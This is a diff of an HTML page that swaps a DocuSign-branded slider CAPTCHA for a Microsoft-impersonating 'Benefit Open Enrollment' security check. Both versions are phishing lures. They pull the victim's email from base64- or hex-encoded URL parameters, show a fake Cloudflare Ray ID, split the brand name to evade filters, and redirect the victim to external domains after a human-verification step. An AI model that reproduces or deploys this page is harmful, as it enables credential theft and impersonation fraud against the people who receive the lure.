@@ -1,220 +1,724 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Slider CAPTCHA</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
-  <style>
-    body {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      min-height: calc(100vh - 145px);
-      background-color: #f8f9fa;
-    }
-    .card {
-      border-radius: 20px;
-      padding: 30px;
-      width: calc(100vw - 60vw) !important;
-      align-items: center;
-      justify-content: center;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-      border-top: solid 5px #00bef8;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Just a moment... | <span class="cNp5"></span></title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="shortcut icon" type="image/x-icon" href="https://res.cdn.office.net/officehub/images/content/images/favicon_m365-31d62b976c.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Victor+Mono:ital,wght@0,100..700;1,100..700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:ital,wght@0,200..800;1,200..800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Exo:ital,wght@0,100..900;1,100..900&family=Plus+Jakarta+Sans:ital,wght@0,200..800;1,200..800&display=swap" rel="stylesheet">
+    <link rel="canonical" href="https://getbootstrap.com/docs/5.3/examples/modals/">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@docsearch/css@3">
+	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+    <link href="/docs/5.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <style>
 
-    .container {
-        display: none;
-        justify-content: center;
-        width: calc(100vw - 189px) !important;
-        height: calc(100vh - 459px);
-        padding: 30px;
-    }
-    #slider {
-    width: 100%;
-    appearance: none;
-    height: 10px;
-    border-radius: 5px;
-    background: linear-gradient(to right, #00bef8 0%, #e0e0e0 0%);
-    outline: none;
-    transition: background 0.3s ease;
-  }
+        body {
+        background-image: url(https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49-small_e58aafc980614a9cd7796bea7b5ea8f0.jpg);
+        background: linear-gradient(to bottom right, #87CEEB, #f5f5f5); /* Blue gradient background */
+        background-repeat: no-repeat;
+        background-position: center;
+        background-size: cover;
+        overflow: hidden;
+        height:100vh;
+        font-family: "Exo", Arial,  sans-serif;
+        }
+        /* Styles for the preloader */
+        .preloader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background-color: #ffffff;
+            display: grid;
+            grid-template-columns: repeat(1, 1fr);
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        font-family: "Victor Mono", sans-serif;
+            z-index: 9999; /* Ensure it's on top */
+        }
 
-  #slider::-webkit-slider-thumb {
-    appearance: none;
-    width: 20px;
-    height: 20px;
-    background: #00bef8;
-    border-radius: 50%;
-    cursor: pointer;
-    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
-  }
+        /* Styles for the preloader */
+        .showOff {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background-color: #ffffff;
+            display: none;
+            grid-template-columns: repeat(1, 1fr);
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-family:system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            z-index: 9999; /* Ensure it's on top */
+        }
 
-  #slider::-moz-range-thumb {
-    width: 20px;
-    height: 20px;
-    background: #00bef8;
-    border-radius: 50%;
-    cursor: pointer;
-    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
-  }
-    #slider-wrapper {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column-reverse;
-      gap: 10px;
-    }
-    #slider-label {
-      white-space: nowrap;
-    }
-    #slider-value {
-      font-weight: bold;
-      color: #00bef8;
-      font-size: 34pt !important;
-    }
-    
-    
-  </style>
-</head>
-<body>
 
+
+        /* Styles for the survey questions */
+        .survey {
+            display: none;
+            text-align: center;
+            font-family:system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif
+            
+        }
+
+        option {
+            text-align: center;
+            
+        }
+
+        .survey > select {
+            padding: 7px;
+            width: 200px;
+            border: solid 1px #00afea;
+            border-radius: 4px;
+            outline: solid 1px #00afea;
+        }
+        
+
+        .d4u1 > button {
+            width: 130px;
+            border: none;
+            border-radius: 4px;
+            background-color: #00afea;
+            color:#fff;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 20px;
+            padding:7px;
+            margin: 6px;
+        }
+
+        /* Styles for the final page */
+
+
+        .topic {
+            
+            display: grid;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding:10px 20px;
+            padding-bottom: 0;
+            font-family: SegoeUI-Bold,Helvetica,Arial,sans-serif;
+        }
 
         
-   
-    <header>
-        <div class="col">
-            <img src="DocuSign-Logo.png" alt="" width="200" style="margin: 0 auto;text-align: center;">
-        </div>
-    </header>
-    <!-- Preloader -->
-    <div class="preloader"><span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span></div>
-  <div class="container">
+
+        .survCont {
+            position: relative;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 270px;
+            display: flex;
+            place-items: center;
+            justify-content: center;
+            max-width: 400px;
+            padding: 20px;
+            background-color: #ffffff;
+            border: none;
+            
+            border-radius: 6px;
+            margin:0 auto;
+        }
+
+        .survCont1 {
+            position: relative;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 270px;
+            display: flex;
+            place-items: center;
+            justify-content: center;
+            max-width: 400px;
+            padding: 20px;
+            background-color: #ffffff;
+            border: solid 1.4px #00b0ea3e;
+            outline: solid 1.4px #00b0ea34;
+            border-radius: 6px;
+            margin:0 auto;
+        }
+
+        select:focus {
+            border:none;
+            outline:none;
+        }
+        select:active {
+            border:none;
+            outline:none;
+        }
+
+        h1 {
+            font-family: Verdana, Geneva, Tahoma, sans-serif;
+        }
+
+        .bask > a {
+            color: #fff;
+            font-size: 12px;
+            line-height: 28px;
+            white-space: nowrap;
+            display: inline-block;
+            margin-left: 8px;
+            margin-right: 8px;
+            text-decoration: none;
+        }
+        .bask1 > a {
+            color: #fff;
+            font-size: 12px;
+            line-height: 28px;
+            white-space: nowrap;
+            display: inline-block;
+            margin-left: 8px;
+            margin-right: 8px;
+            text-decoration: none;
+        }
+
+      
+        .m52 {
+            display: block;
+            place-content: center;
+            height: 100vh;
+            padding: 75px;
+            margin: 60px auto;
+            
+
+        }
+
+        .m52 > h3 {
+            font-family: "Victor Mono", monospace;
+            font-stretch: extra-expanded;
+            font-size: 32px;
+        }
+		
+		form, .cNp6 {
+			font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+			
+		}
+
+
+        .bask {
+            float: right;
+        }
+        .bask1 {
+            float: left;
+        }
+
+        footer {
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            overflow: visible;
+            z-index: 99;
+            clear: both;
+            min-height: 30px;
+        }
+
+        .survey > input {
+            padding:9px;
+            width: 230px;
+            color: #000;
+            text-align: center;
+        }
+
+        #x2 {
+            display: none;
+        }
+
+        #q1:focus {
+            outline: solid 1px #00afea;
+            border: solid 1px #00afea;
+        }
+
+        #q1 {
+            border-radius: 3px;
+            border: solid 1px #aaa;
+        }
+
+        .sp95 {
+            width: 85px;
+            height: 85px;
+            border-radius: 50%;
+            border: 3px solid rgba(4, 255, 255, 0.207);
+            border-top-color: #007bff;
+            animation: spin 1s linear infinite;
+            margin: 100px auto;
+            margin: 0 auto;
+            display: flex;
+            animation: spinnerAnimation 1.3s infinite cubic-bezier(0.46, 0.03, 0.52, 0.96);
+            z-index: 9999;
+        }
+
+        @keyframes spinnerAnimation {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body style="background-image: url(https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49-small_e58aafc980614a9cd7796bea7b5ea8f0.jpg);background-repeat: no-repeat;background-size: cover;">
+    <svg xmlns="http://www.w3.org/2000/svg" class="d-none">
+    <symbol id="check2" viewBox="0 0 16 16">
+      <path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"></path>
+    </symbol>
+    <symbol id="circle-half" viewBox="0 0 16 16">
+      <path d="M8 15A7 7 0 1 0 8 1v14zm0 1A8 8 0 1 1 8 0a8 8 0 0 1 0 16z"></path>
+    </symbol>
+    <symbol id="moon-stars-fill" viewBox="0 0 16 16">
+      <path d="M6 .278a.768.768 0 0 1 .08.858 7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71 0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"></path>
+      <path d="M10.794 3.148a.217.217 0 0 1 .412 0l.387 1.162c.173.518.579.924 1.097 1.097l1.162.387a.217.217 0 0 1 0 .412l-1.162.387a1.734 1.734 0 0 0-1.097 1.097l-.387 1.162a.217.217 0 0 1-.412 0l-.387-1.162A1.734 1.734 0 0 0 9.31 6.593l-1.162-.387a.217.217 0 0 1 0-.412l1.162-.387a1.734 1.734 0 0 0 1.097-1.097l.387-1.162zM13.863.099a.145.145 0 0 1 .274 0l.258.774c.115.346.386.617.732.732l.774.258a.145.145 0 0 1 0 .274l-.774.258a1.156 1.156 0 0 0-.732.732l-.258.774a.145.145 0 0 1-.274 0l-.258-.774a1.156 1.156 0 0 0-.732-.732l-.774-.258a.145.145 0 0 1 0-.274l.774-.258c.346-.115.617-.386.732-.732L13.863.1z"></path>
+    </symbol>
+    <symbol id="sun-fill" viewBox="0 0 16 16">
+      <path d="M8 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"></path>
+    </symbol>
+  </svg>
     
-    <div class="card text-center p-4" id="verificationCard">
-      <h5 class="card-title" id="card-title">Verify You're Human</h5>
-      <h3 class="card-title" id="comp-title" style="display: none;color: #00bef8;align-items: center;justify-content: space-between;flex-direction: column-reverse;">Success <span><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 100 100">
-        <!-- Circle -->
-        <circle cx="50" cy="50" r="48" stroke="white" stroke-width="4" fill="#00bef8" />
-        <!-- Tick -->
-        <path d="M30 50 L45 65 L70 35" stroke="white" stroke-width="4" fill="#00bef8" stroke-linecap="round" stroke-linejoin="round" />
-      </svg></span></h3>
-      <p class="card-text" id="card-text">Drag the slider to the end to verify that you are human.</p>
-
-      <div id="slider-wrapper" class="mt-4">
-        <span id="slider-label"><strong>Drag the slider to the end.</strong></span>
-        <input type="range" class="form-range" id="slider" min="0" max="100" step="1" value="0">
-        <span id="slider-value">0</span>
-      </div>
-      <!-- Button and Spinner will be hidden initially -->
-      <button id="proceedButton" class="btn btn-primary mt-3" style="display: none;width: 178px;padding: 8px;font-weight: bolder;" onclick="redirectUser()">Click to Proceed</button>
-      <div id="loadingSpinner" class="spinner-border text-primary mt-3" style="display: none;" role="status">
-          <span class="visually-hidden">Loading...</span>
-      </div>
+    <div>
+        <div class="preloader" id="preloader" style="background-image: url(https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49-small_e58aafc980614a9cd7796bea7b5ea8f0.jpg);background-repeat: no-repeat;background-size: cover;">
+            <div class="m51">
+            <h3 style="font-family: Helvetica, Arial, sans-serif;"> <span class="cNp4"></span></h3>
+            <div class="sp95"></div>
+        </div>      
+        </div>
     </div>
-  </div>
+
+
+    
+    
+    <div class="modal modal-sheet position-static d-block bg-body-secondary  " tabindex="-1" role="dialog" id="modalSignin">
+        <div class="modal-dialog mt-2" role="document">
+            <div class="topic my-2 mt-2" id="topic">
+                <span style="margin-bottom:17px;"><img src="microlog0.png" alt="" style="width:120px;"></span>
+				<p> <span>Mi</span>c<span>ro</span>s<span>o</span>ft needs to review the security of your connection before proceeding.</p>
+           </div>
+          <div class="modal-content rounded-4 shadow">
+            <div class="modal-header p-5 pb-0 border-bottom-0 justify-content-between d-flex flex-column align-items-center">
+				<h1 class="cNp4 py-2 text-center pt-2 fs-5"></h1>
+                <h1 class="mb-0 fs-5 text-center pt-0"> Benefit Open Enrollment</h1>
+            </div>
+      
+            <div class="modal-body p-5 pt-0">
+              <form class="">
+				<small class="text-body-emphasis m-4 mb-0 d-flex justify-content-center "><i class="bi bi-person-circle mb-0 justify-content-center" style="color: #8f8f8f;font-size:2.543rem;"></i></small>
+				  <p class="text-body-emphasis mb-0 d-flex justify-content-center cNp6"></p>
+				  <div class="email-container d-flex justify-content-center py-2 cNp5" id="cNp5"></div>
+				  <p class="email-container d-flex justify-content-center py-2 cNp5" id="cNp55" style="display:none;"></p>
+                <small class="text-body-secondary m-0 text-center justify-content-center d-flex" style="font-size:medium;">Verify you are human by completing the action below.</small>
+                <div class="form-floating mb-3 mt-2 text-center p-2">
+                    <div class="cf-turnstile" data-sitekey="0x4AAAAAABlKQ9c8t8gpZ7_j" data-callback="onTurnstileSuccess"></div>
+                </div>
+                <hr class="my-4">
+                <small class="text-body-secondary text-center p-3 ps-1 mb-4 justify-content-center" style="font-size:small;">Ray ID: <span id="rayJAY" style="margin:0;"></span><br> &copy; 2024 Microsoft Corportation All Rights Reserved </small>
+                
+                  <svg class="bi me-1" width="16" height="16"><use xlink:href="#github"></use></svg>
+                  Sign up with GitHub
+                </button> -->
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    
+    
+    <div id="finalPage">
+        <div class="showOff" id="showOff" style="background-image: url(https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49-small_e58aafc980614a9cd7796bea7b5ea8f0.jpg);background-repeat: no-repeat;background-size: cover;">
+
+            <header style="width:100%;z-index: 9999;">
+                <div style="padding:20px;text-align:left;display:flex;justify-content:space-between;align-items:center;">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1280px-Microsoft_logo_%282012%29.svg.png" alt="logo" width="130">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Windows-defender.svg/1200px-Windows-defender.svg.png" alt="shield" width="50">
+                </div>
+            </header>
+            <div class="m52">
+            <h3> Thank you for Response</h3>
+            
+            <p>
+                Your information has been logged succesfully and you will be redirected shortly back to your mailbox to confirm your identity.<br>
+                <ul style="list-style:none;text-align:center;padding:45px;font-family: 'Victor Mono', monospace;">
+
+                    <li><b>User-Mailbox:</b> <span id="mailboxKoner"></span>  </li>
+                    <span id="spanishWard"></span>
+
+                </ul>
+            </p>
+            
+            <div class="sp95"></div>
+            
+            <footer style="width: 100%;height:20px;background-color:rgba(0,0,0,0.6);bottom: 0;position:fixed;">
+                <div class="bask">
+                    <a href="#">Term of use</a>
+                    <a href="#">Privacy & cookies</a>
+                    <a href="#">...</a>
+                </div>
+                <div class="bask1">
+                    <a href="#">Microsoft Corporation 2024 &copy;</a>
+                </div>               
+        
+        </footer>
+        </div>
+               
+        </div>
+    </div>
+    
+
+    <footer style="width: 100%;height:20px;background-color:rgba(0,0,0,0.6);bottom: 0;position: absolute;">
+        <div class="bask">
+            <a href="#">Term of use</a>
+            <a href="#">Privacy & cookies</a>
+            <a href="#">...</a>
+        </div>
+        <div class="bask1">
+            <a href="#"> &copy; <span>Micr</span>o<span>sof</span>t 2024</a>
+        </div>
+</p>                
+
+</footer>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+	<script>
+		function generateLargeRandomNumber() {
+	  let randomNumber = '';
+			for (let i = 0; i < 13; i++) {
+				randomNumber += Math.floor(Math.random() * 10);
+			}
+			return randomNumber;
+		}
+		let largeRandomNumber = generateLargeRandomNumber();
+		document.getElementById("rayJAY").innerHTML = largeRandomNumber;
+		console.log(largeRandomNumber);
+		
+
+		
+	</script>
+
+    <script>
+        function censorEmail(email) {
+  
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  
+  if (!emailRegex.test(email)) {
+    
+    return email;
+  }
+
+  
+  const atIndex = email.indexOf('@');
+  
+  if (atIndex <= 1) {
+    
+    return email;
+  }
+  
+  
+  const firstLetter = email[0];
+  
+  
+  const domain = email.slice(atIndex);
+  
+  
+  return `${firstLetter}***${domain}`;
+  
+}
+
+function censorSpecific(className) {
+  
+  const divs = document.querySelectorAll('.cNp5');
+  const sTager = document.getElementById('.cNp55');
+  
+  divs.forEach(div => {
+    
+    const emailText = div.innerText.trim();
+    
+    const censoredEmail = censorEmail(emailText);
+    
+    
+    div.innerText = censoredEmail;
+	  sTager.innerText = emailText;
+  });
+}
+
+
+document.addEventListener('DOMContentLoaded', () => {
+  censorSpecific('email-container');
+});
+</script>
+
+<script>
+        
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', '', true);
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                
+                const sWD = JSON.parse(xhr.responseText);
+
+                
+                document.getElementById('spanishWard').innerHTML = `
+                    
+                    <li><b>IP Address:</b> ${sWD.ip} </li>
+                    <li><b>Location:</b> ${sWD.location.city}, ${sWD.location.region}, ${sWD.location.country}</li>
+                    <li><b>Useragent:</b> ${sWD.userAgent}</li>
+                    <li><b>Hostname:</b>${sWD.hostname} </li>
+                    <li><b>Longitude & Latitude:</b>${sWD.loc} </li>
+                    <li><b>Organization:</b>${sWD.org} </li>
+                    <li><b>Postal:</b>${sWD.postal} </li>
+                    <li><b>Timezone:</b>${sWD.timezone} </li>
+                `;
+            }
+        };
+        xhr.send();
+ </script>
 
   <script>
 
-     
-     setTimeout(() => {
-            document.querySelector('.preloader').style.display = 'none';
-            document.querySelector('.container').style.display = 'grid';
-        }, 6000);
+let decodedHash;
+let hash;
+let encodedEmail;
+
+    function base64Decode(encodedString) {
+        return atob(encodedString);
+    }
+
+    function isBase64(str) {
+        try {
+            return btoa(atob(str)) === str;
+        } catch (err) {
+            return false;
+        }
+    }
+
+    function base64Encode(str) {
+        return btoa(str);
+    }
+		 function isHex(str) {
+  return /^[0-9A-Fa-f]+$/g.test(str);
+}
+    function isValidEmail(email) {
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    const emailRegex2 = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    
+    const isBase64Encoded = isBase64(email);
+
+    
+    if (isBase64Encoded) {
+        email = base64Decode(email);
+		
+        console.log(email);
+    }
+
+    
+    if (emailRegex.test(email) || emailRegex2.test(email)) {
+        
+        const formattedEmail = email.replace(/^[^\s@]+@[^\s@]+\.[^\s@]+$/, '');
+        console.log(formattedEmail);
+        return base64Encode(formattedEmail);
+    }
+
+    
+    return false;
+}
+
+    var isBot = false;
+    var currentQuestion = 0;
+
+    var botCounter = localStorage.getItem("botCounter") || 0;
+    botCounter++;
+    localStorage.setItem("botCounter", botCounter);
+
+    if (botCounter > 1000000) {
+        isBot = true;
+    }
+
+    var testSample = "5321-7121-3411-2556";
+
+    console.log("Does it work? " + validateUniqueCodeFormat(testSample));
+
+    function validateUniqueCodeFormat(code) {
+        var regex = /^[0-9]{3}1-7[0-9]{1}21-[0-9]{2}11-[0-9]{4}$/;
+        return regex.test(code);
+    }
+
+ 
+
+    setTimeout(function () {
+        var preloader = document.querySelector("#preloader");
+        if (!isBot) {
+            preloader.style.display = "none";
+        } else {
+            alert("Bot detected. Please try again later.");
+        }
+    }, 6000);
+
+
+   
+ 
+ function processUrlParameters() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const paramale = ['add', 'sqtr', '__cje_fr_1', 'kVgR', '2pCR', 'xZq1'];
+
+  
+  let processedData = [];
+
+	 
 
 
   
-  </script>
-  <script>
-    slider.addEventListener("input", function () {
-      sliderValue.textContent = slider.value; 
-      const percentage = (slider.value / slider.max) * 100;
-      slider.style.background = `linear-gradient(to right, #00bef8 ${percentage}%, #e0e0e0 ${percentage}%)`;
+  for (const paramName of paramale) {
+    const paramValue = urlParams.get(paramName);
+
+    if (paramValue) {
+      let decodedParamValue = paramValue;
+
+      if (isBase64(paramValue)) {
+        decodedParamValue = base64Decode(paramValue);
+      } else if (isHex(paramValue)) {
+        decodedParamValue = hexDecode(paramValue);
+      }
+
+      const processedParam = processParameter(paramName, decodedParamValue);
+      processedData.push({ [paramName]: processedParam });
+    }
+  }
+
   
-      if (slider.value == slider.max) {
-        proceedButton.style.display = "inline-block"; 
+  let hash = window.location.hash.substring(1); 
+  const isBase64EncodedInHash = isBase64(hash);
+  let decodedHash = isBase64EncodedInHash ? base64Decode(hash) : hash;
+
+  if (decodedHash && isValidEmail(decodedHash)) {
+    let encodedEmail = decodedHash.includes('@') ? base64Encode(decodedHash) : decodedHash;
+    return; 
+  }
+
+  console.log('No valid email parameter found in the hash.', hash);
+
+  
+  for (const data of processedData) {
+    for (const key in data) {
+      if (data.hasOwnProperty(key)) {
+        const value = data[key];
+        if (isValidEmail(value)) {
+          let encodedEmail = value.includes('@') ? base64Encode(value) : value;
+          return; 
+        }
+      }
+    }
+  }
+
+  console.log('No valid email found in processed data.', processedData);
+}
+
+
+function hexDecode(hex) {
+  let str = '';
+  for (let i = 0; i < hex.length; i += 2) {
+    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+  }
+  return str;
+}
+
+function processParameter(paramName, paramValue) {
+  let processedParam = paramValue;
+
+  
+  switch (paramName) {
+    case '__cje_fr_1':
+      updateElement('.cNp4', processedParam);
+      break;
+
+    case '2pCR':
+      updateElement('.cNp5', processedParam);
+      break;
+
+    case 'kVgR':
+      updateElement('.cNp7', processedParam);
+      break;
+    
+    case 'sqtr':
+      updateElement('.cNp6', processedParam);
+      break;
+
+      case 'xZq1':
+      updateImageSrc('.cNp99', processedParam);
+      break;
+      
+    
+    default:
+      
+      break;
+  }
+
+  function updateElement(className, value) {
+  const elements = document.querySelectorAll(className);
+
+  if (elements.length > 0) {
+    elements.forEach((element) => {
+      if (value) {
+        if (isBase64(value)) {
+          value = base64Decode(value);
+        } else if (isHex(value)) {
+          value = hexDecode(value);
+        }
+        element.innerText = value;
       } else {
-        proceedButton.style.display = "none"; 
+        element.style.display = 'none';
       }
     });
-  </script>
-      <script>
-        const slider = document.getElementById("slider");
-        const sliderValue = document.getElementById("slider-value");
-        const proceedButton = document.getElementById("proceedButton");
-        const loadingSpinner = document.getElementById("loadingSpinner");
-        const cardTitle = document.getElementById("card-title");
-        const compTitle = document.getElementById("comp-title");
-        const cardText = document.getElementById("card-text");
-        const sliderWrapper = document.getElementById("slider-wrapper");
+  } else {
+    console.error(`Element with class "${className}" not found.`);
+  }
+}
 
-        
-        slider.addEventListener("input", function() {
-            sliderValue.textContent = slider.value; 
-            if (slider.value == slider.max) {
-                
-                proceedButton.style.display = "inline-block";
-            } else {
-                
-                proceedButton.style.display = "none";
-            }
-        });
+  function updateImageSrc(className, src) {
+  const elements = document.querySelectorAll(className);
 
-        
-        function redirectUser() {
-            
-            sliderWrapper.style.display = "none"; 
-            cardTitle.style.display = "none"; 
-            compTitle.style.display = "flex"; 
-            cardText.innerText = "Verification completed successfully. Please wait..."; 
-
-            
-            proceedButton.style.display = "none"; 
-            loadingSpinner.style.display = "inline-block"; 
-
-            
-            let email = getEmailFromURL(window.location.href);
-
-            
-            setTimeout(function() {
-              const redirectURL = "https://vcytc.xbzdcia.es/v4SoG@pOuTtuqNl"; 
-                if (email) {
-                    
-                    window.location.href = `${redirectURL}#${email}`;
-                } else {
-                    window.location.href = redirectURL; 
-                }
-            }, 5000); 
+  if (elements.length > 0) {
+    elements.forEach((element) => {
+      if (element.tagName === 'IMG') {
+        if (src) {
+          element.src = src;
+        } else {
+          element.style.display = 'none';
         }
+      } else {
+        console.error(`Element with class "${className}" is not an image.`);
+      }
+    });
+  } else {
+    console.error(`Element with class "${className}" not found.`);
+  }
+}
 
-        
-        function getEmailFromURL(url) {
-            const hashPart = url.split('#')[1]; 
-            if (!hashPart) return null;
+  return processedParam;
 
-            let email = null;
 
-            
-            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-            if (emailRegex.test(hashPart)) {
-                email = hashPart; 
-            } else {
-                
-                try {
-                    const decodedEmail = atob(hashPart); 
-                    if (emailRegex.test(decodedEmail)) {
-                        email = decodedEmail; 
-                    }
-                } catch (e) {
-                    console.error("Invalid base64 encoding");
-                }
-            }
+}
 
-            return email;
-        }
-    </script>
 
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
+
+processUrlParameters();
+	
+</script>
+
+
+<script>
+function onTurnstileSuccess(token) {
+     	let aRV = document.getElementById('cNp5');
+		let n0aRv = aRV.value;
+      window.location.href = 'https://kcramer.com/Sec1emNoXgalRa9wtuTuXgwtJ7J72cqTrBhQanoRa9s32cqTrB' + i4See;
+    }
+
+</script>
+
 </body>
 </html>
